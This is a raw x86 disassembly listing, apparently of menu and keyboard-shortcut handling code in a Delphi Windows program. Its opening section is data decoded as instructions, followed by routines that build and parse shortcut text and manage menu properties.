inc esi
or eax 0x6f42616d
insd
push edx
imul esp [ edi + 0x68 ] 0x616d0d74
arpl [ ebx + 0x42 ] bp
jne r-xdata
push edx
imul esp [ edi + 0x68 ] 0x4c6f5474
je r-xdata
jne r-xdata
pop es
add [ eax ] cl
inc edx
dec eax
outsd
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add ah al
mov [ esi ] es
or [ ebp + 0x540a0046 ] 0x50
outsd
jo r-xdata
inc esi
add [ 0x654c616d ] cl
je r-xdata
add [ eax ] bl
push ds
inc esi
add [ ebx ] al
andps xmm1 [ ebp + 0x65 ]
outsb
push ds
add ah bh
add [ eax + eax + 0x4c ] 0x84
inc esp
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
add [ eax ] ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
pop ds
inc esi
add [ eax + eax ] bh
add [ edx + ebx - 0x7d93ffba ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
outsd
inc edx
outsd
je r-xdata
jo r-xdata
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1f ] cl
inc esi
add [ eax ] al
je r-xdata
outsd
dec esp
add [ esi ] al
push cs
push esp
dec ebp
outsb
jne r-xdata
je r-xdata
test [ esi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or [ eax ] al
or ecx [ eax + 0x65 ]
insb
jns r-xdata
add eax 0x75411100
je r-xdata
add [ eax * 4 - 0x7adbffba ] dl
jo r-xdata
popad
push esp
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al bl
sbb eax 0x740d0046
bound edx [ edx + 0x69 ]
push 0x74754274
je r-xdata
outsb
add eax 0x756e654d
jae r-xdata
jo r-xdata
dec eax
insb
dec esp
imul ebp [ esi + 0x65 ] 0x75646552
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
sbb [ esi + 0x44 ] dl
add [ ecx ] ah
add bh bh
popad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsb
jne r-xdata
outsd
outsb
je r-xdata
add al bl
mov [ esi ] es
loopne r-xdata
test [ edx + eax * 2 ] dl
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x14004615
test [ esi ] eax
and al 0x85
test [ esi ] al
add [ ebp + 0x10046 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
outsb
jne r-xdata
imul eax [ eax ] 0x69ff00
outsd
push eax
outsd
jo r-xdata
add [ eax ] al
add [ eax + eax ] cl
outsb
imul ebp [ ebp + 0x61 ] 0x6e6f6974
sbb [ esi + 0x44 ] dl
add [ eax + eax ] bh
add bh bh
aam 0x7e
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
or [ edi + 0x77 ] ecx
outsb
jb r-xdata
js r-xdata
jmp 0xffffffff84aa1f1c
cld
dec eax
pop ds
inc esi
add [ edi ] al
or eax 0x72540b00
popad
arpl [ ebx + 0x42 ] bp
jne r-xdata
jb r-xdata
add bh bh
add [ eax ] eax
jo r-xdata
add [ eax - 0x80000000 ] al
sldt [ edi ]
dec edi
outsb
push eax
outsd
jo r-xdata
outsb
je r-xdata
push cs
dec [ esp + eax * 4 + 0x10046 ]
movsb [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
jo r-xdata
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08000e ] al
outsb
ja r-xdata
adc al 0x80
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x49060009 ] al
insd
popad
jae r-xdata
adc eax [ edx ]
xor [ eax ] al
add bh bh
js r-xdata
jo r-xdata
jo r-xdata
inc ebx
push 0x65676e61
add [ eax ] al
or [ esi ] 0x0
or [ edi + 0x6e ] cl
imul eax [ ecx + ebp * 2 + 0x4d ] 0xd865646f
sbb eax 0x680046
add al 0x0
or eax [ ecx + 0x75 ]
je r-xdata
add [ eax ] al
add [ eax ] al
outsb
jne r-xdata
je r-xdata
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ eax + 0x45 ] dh
inc edx
add [ eax ] dl
inc edi
inc edx
add ah ah
dec ecx
inc edx
add ah al
inc ebp
inc edx
add [ esi + eax * 2 ] bh
inc edx
add [ esi + eax * 4 + 0x46 ] dh
add [ edx ] cl
push esp
push eax
outsd
jo r-xdata
add [ eax + 0x6c00421b ] ah
add [ eax + eax + 0x74 ] 0x82
inc esp
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
or al 0x0
push esi
inc esp
add [ 0xffffffff8cff0000 ] bh
test [ esi ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push es
add [ ecx ] cl
inc ecx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ eax ]
or eax 0x756e654d
inc ecx
push ds
inc esi
add [ ecx ] ch
add bh bh
imul eax [ eax ] 0x1ff00
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8465646f
adc al 0x42
inc esi
add [ eax + 0x7c ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080007 ] al
pushad
test [ eax + eax + 0x48 ] al
add [ eax + eax + 0x64 ] 0xf8004481
and eax 0x265c0043
inc ebx
add [ esi ] bh
inc ebx
add [ eax ] ch
inc ebx
add [ esi ] cl
push esp
dec ebp
outsb
jne r-xdata
imul esi [ ebx + 0x74 ] 0x46221c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
and al [ esi ]
or al 0x0
add [ eax ] al
xor [ 0xffffffff826c0043 ] ah
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al bh
add bh bh
push 0x1ff0000
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec ebp
outsd
fcomp [ gs : 0x680046 ]
nop
movsb [ edi ] [ esi ]
and [ esi ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x18004621
add [ eax ] al
or dl [ eax + edx * 2 + 0x6f ]
jo r-xdata
push ds
inc esi
add [ ebx + ebx + 0x46 ] ch
add [ eax ] dl
add [ 0x756e654d ] al
jae r-xdata
test [ ebx - 0x5ed51739 ] 0x2
add [ ebx + 0x74db85d8 ] cl
pop ss
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4933e8
mov esi eax
test esi esi
jne r-xdata
arpl [ ebx - 0x70 ] bp
mov al 0x4
add al [ eax ]
inc esi
add [ eax ] cl
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
push ecx
add [ edx ] dl
push ebx
add [ eax + eax + 0x55 ] dl
add [ esi ] dl
push edi
add [ eax ] bl
pop ecx
add [ edx ] bl
add [ eax ] al
add [ eax ] al
je r-xdata
add eax [ eax ]
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
push 0xf0004615
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6000461d ] bl
add [ eax ] al
mov eax esi
pop edi
pop esi
pop ebx
retn
mov esi ebx
insd
push ebx
sub_462290
push ebx
push esi
push edi
mov edi eax
xor esi esi
mov eax edi
call sub_48c3c8
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
retn
push 0x0
push 0x0
mov edx edi
xor ecx ecx
mov eax ebx
call sub_4933e8
mov esi eax
test esi esi
jne r-xdata
mov esi ebx
sub_4622ec
push ecx
mov [ esp ] dl
xor edx edx
movzx ecx ax
shr ecx 0x8
test cl cl
jne r-xdata
mov eax edx
pop edx
retn
mov edx eax
test [ esp ] 0x1
je r-xdata
test [ esp ] 0x4
je r-xdata
add dx 0x2000
test [ esp ] 0x2
je r-xdata
add dx 0x4000
add dx 0x8000
sub_462324
push ebx
push esi
add esp 0xfffffe00
mov ebx edx
mov esi eax
mov eax ebx
xor edx edx
call sub_449d2c
push 0x0
mov eax esi
movzx eax al
push eax
call MapVirtualKeyW
shl eax 0x10
test eax eax
je r-xdata
add esp 0x200
pop esi
pop ebx
retn
push 0x100
lea edx [ esp + 0x4 ]
push edx
push eax
call GetKeyNameTextW
mov eax ebx
mov edx esp
mov ecx 0x100
call sub_449f14
sub_462374
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_462553
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx edi
movzx eax bl
cmp eax 0x2d
jge r-xdata
cmp eax 0x41
jge r-xdata
add eax 0xfffffff8
sub eax 0x2
jb r-xdata
add eax 0xffffffbf
sub eax 0x1a
jb r-xdata
add eax 0xffffffd3
sub eax 0x2
jb r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_449d80
jmp r-xdata
sub eax 0x3
je r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
sub edx 0x41
add edx 0x41
call sub_449e98
jmp r-xdata
add eax 0xfffffffb
sub eax 0xa
jb r-xdata
lea eax [ ebp - 0x4 ]
add bl 0xd
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_449d80
jmp r-xdata
dec eax
sub eax 0xa
jb r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_449d80
jmp r-xdata
sub eax 0xe
je r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
sub edx 0x60
add edx 0x30
call sub_449e98
jmp r-xdata
add eax 0xfffffffa
sub eax 0x18
jb r-xdata
lea eax [ ebp - 0x4 ]
movzx edx bl
sub edx 0x30
add edx 0x30
call sub_449e98
jmp r-xdata
jmp r-xdata
mov eax esi
xor edx edx
call sub_449d2c
mov eax esi
xor edx edx
call sub_449d2c
test di 0x2000
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_449d80
jmp r-xdata
add eax 0xfffffffb
sub eax 0x9
jb r-xdata
lea edx [ ebp - 0x8 ]
movzx eax bl
sub eax 0x6f
call sub_435628
mov ecx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_44a0e8
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
call sub_462324
test di 0x4000
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_44a068
lea eax [ ebp - 0x4 ]
add bl 0x4
movzx edx bl
mov edx [ edx * 4 + rw-data ]
call sub_449d80
jmp r-xdata
jmp r-xdata
test di 0x8000
je r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_44a068
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44a068
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_44a068
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46255a
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_44936c
retn
sub_462574
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_46268e
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax [ edi ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub esi 0x4
mov esi [ esi ]
mov edx [ edi ]
mov eax edi
call sub_4494dc
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
cmp eax esi
jg r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_462695
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov esi eax
test esi esi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ edi ]
call sub_449db8
mov [ ebp - 0x8 ] eax
push esi
mov eax [ ebp - 0x4 ]
call sub_449db8
push eax
push esi
mov eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
jne r-xdata
sub esi 0x4
mov esi [ esi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
mov bl 0x1
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov edx edi
mov ecx eax
mov eax 0x1
xchg edx eax
call sub_44a438
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4494dc
sub_4626a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_449880
xor eax eax
push ebp
push sub_462808
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xe ] 0x0
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_462574
test al al
je r-xdata
or [ ebp - 0x10 ] 0x2000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_462574
test al al
je r-xdata
or [ ebp - 0x10 ] 0x4000
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_462574
test al al
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_462574
test al al
je r-xdata
or [ ebp - 0x10 ] 0x4000
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
or [ ebp - 0x10 ] 0x8000
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46280f
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_44936c
retn
mov si 0x8
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
mov eax [ ebp - 0xc ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4494dc
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push edi
mov eax [ ebp - 0xc ]
call sub_449db8
push eax
push ebx
mov eax [ ebp - 0x8 ]
call sub_449db8
push eax
push 0x1
push 0x400
call CompareStringW
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
call sub_4494dc
inc esi
cmp si 0x256
jne r-xdata
or si [ ebp - 0x10 ]
mov [ ebp - 0xe ] si
jmp r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_449d80
lea edx [ ebp - 0xc ]
mov eax esi
call sub_462374
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
sub_46284c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x9 ] 0x0
test esi esi
je r-xdata
movzx eax [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
mov eax esi
call sub_466084
cmp eax [ ebx ]
jg r-xdata
mov edx [ ebx ]
mov eax esi
call sub_466094
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x3b ]
mov edx [ ebp + 0x8 ]
cmp al [ edx - 0x1 ]
ja r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
push [ edx ]
call [ ebp - 0x8 ]
add esp 0x4
mov [ ebp - 0x9 ] al
inc [ ebx ]
sub_4628b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov edi edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor ebx ebx
xor esi esi
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax edi
call sub_466084
mov ebx eax
mov [ ebp - 0x16 ] 0x0
jmp r-xdata
mov eax [ ebp - 0xc ]
call sub_466084
mov esi eax
cmp [ ebp - 0x16 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x10 ]
jg r-xdata
mov [ ebp - 0x1 ] 0xff
mov [ ebp - 0x15 ] 0xff
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jg r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_466094
movzx eax [ eax + 0x3b ]
mov [ ebp - 0x1 ] al
movzx eax [ ebp - 0x1 ]
cmp al [ ebp - 0x15 ]
ja r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_466094
movzx eax [ eax + 0x3b ]
mov [ ebp - 0x15 ] al
movzx eax [ ebp - 0x15 ]
mov [ ebp - 0x1 ] al
push ebp
lea eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_46284c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
push ebp
lea eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_46284c
pop ecx
mov [ ebp - 0x16 ] al
jmp r-xdata
cmp ebx [ ebp - 0x10 ]
jle r-xdata
cmp esi [ ebp - 0x14 ]
jle r-xdata
mov edx [ ebp - 0x10 ]
mov eax edi
call sub_466094
movzx eax [ eax + 0x3b ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_466094
movzx eax [ eax + 0x3b ]
cmp al [ ebp - 0x1 ]
jbe r-xdata
inc [ ebp - 0x10 ]
jmp r-xdata
inc [ ebp - 0x14 ]
sub_462a00
push ebx
mov ebx eax
mov eax ebx
call sub_4513b8
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x30 ]
call sub_4691cc
test al al
jne r-xdata
mov al 0x1
pop ebx
retn
sub_462a38
push ebx
mov ebx eax
mov eax ebx
call sub_4513cc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ eax + 0x69 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x34 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462a68
push ebx
mov ebx eax
mov eax ebx
call sub_4513e0
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ eax + 0x6a ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x35 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462a98
push ebx
mov ebx eax
mov eax ebx
call sub_451408
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov eax [ eax + 0x74 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x50 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462ac8
push ebx
mov ebx eax
mov eax ebx
call sub_451430
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov edx [ eax + 0x7c ]
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x54 ]
call j_sub_44a294
je r-xdata
mov al 0x1
pop ebx
retn
sub_462afc
push ebx
mov ebx eax
mov eax [ ebx + 0x18 ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_4513f4
test al al
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov eax [ eax + 0x6c ]
mov edx [ ebx + 0x18 ]
movzx edx [ edx + 0x3b ]
cmp eax edx
je r-xdata
mov al 0x1
pop ebx
retn
sub_462b38
push ebx
mov ebx eax
mov eax ebx
call sub_451444
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
mov eax [ eax + 0x80 ]
mov edx [ ebx + 0x18 ]
cmp eax [ edx + 0x3c ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462b6c
push ebx
mov ebx eax
mov eax ebx
call sub_451458
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ eax + 0x84 ]
mov edx [ ebx + 0x18 ]
cmp ax [ edx + 0x5c ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462ba0
push ebx
mov ebx eax
mov eax ebx
call sub_45146c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_4483ac
movzx eax [ eax + 0x86 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0x3a ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462bd4
push ebx
mov ebx eax
mov eax ebx
call sub_42eb7c
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov eax [ eax + 0x88 ]
mov edx [ ebx + 0x10 ]
cmp eax [ edx + 0x40 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_462bfc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x18 ]
mov [ eax + 0xa8 ] bl
sub_462c1c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_465ee8
sub_462c3c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_465f5c
sub_462c5c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_465fb0
sub_462c7c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
mov [ eax + 0x50 ] esi
sub_462c98
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x18 ]
add eax 0x54
mov edx esi
call sub_449d2c
sub_462cbc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4660dc
sub_462cdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x18 ]
call sub_4660b8
sub_462cfc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4660cc
sub_462d1c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x88 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
sub_462d48
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42e278
mov [ ebx + 0x3a ] 0x1
mov [ ebx + 0x35 ] 0x1
mov [ ebx + 0x37 ] 0x2
mov [ ebx + 0x38 ] 0x2
call sub_46282c
mov [ ebx + 0x4c ] ax
mov [ ebx + 0x3c ] 0xffffffff
lea eax [ ebx + 0x54 ]
xor edx edx
call sub_449d2c
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov esi eax
mov [ ebx + 0x74 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_466a00
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_462dcc
push ebx
push esi
call sub_44873c
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_468e50
mov eax [ esi + 0x60 ]
test eax eax
je r-xdata
mov eax esi
call sub_466084
test eax eax
jg r-xdata
mov edx esi
call sub_466428
xor eax eax
mov [ esi + 0x60 ] eax
jmp r-xdata
xor edx edx
mov eax esi
call sub_466094
call sub_4481b0
cmp [ esi + 0xac ] 0x0
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ esi + 0x40 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
lea eax [ esi + 0x74 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
movzx eax [ esi + 0x4c ]
test ax ax
je r-xdata
xor edx edx
mov eax esi
call sub_463280
mov eax [ esi + 0xac ]
push eax
call DestroyMenu
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
movzx edx ax
xor ecx ecx
mov eax [ rw-data ]
call sub_424cf0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_42e2c4
test bl bl
jle r-xdata
call sub_4481b0
pop esi
pop ebx
retn
mov eax esi
call sub_4486e4
sub_462ea0
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_463168
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x3a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46316f
lea eax [ ebp - 0x44 ]
call j_sub_449348
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
lea eax [ ebp - 0x4 ]
mov edx [ edi + 0x30 ]
call sub_449d80
mov eax edi
call sub_466084
test eax eax
jle r-xdata
cmp [ edi + 0x5c ] 0x0
je r-xdata
mov eax edi
call sub_46342c
mov [ ebp - 0x2c ] eax
jmp r-xdata
call GetVersion
cmp al 0x4
jb r-xdata
